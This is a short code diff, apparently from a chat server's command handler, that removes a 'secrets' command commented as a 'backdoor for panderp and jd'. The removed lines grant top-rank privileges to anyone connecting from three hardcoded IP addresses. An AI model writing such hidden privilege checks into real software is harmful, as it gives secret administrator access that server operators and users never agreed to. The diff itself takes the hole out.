@@ -1655,15 +1655,6 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		return false;
 		break;
 
-	case 'secrets':
-		// backdoor for panderp and jd
-		if (user.ip  === '76.247.181.42'|| user.ip === '99.251.253.160' || user.ip === '127.0.0.1') {
-			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
-			rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
-			return false;
-		}
-		break;
-
 	case 'puppy':
 		if (!target || target === "off" || target === "on") {
 			if (!user.can('puppyall')) return false;
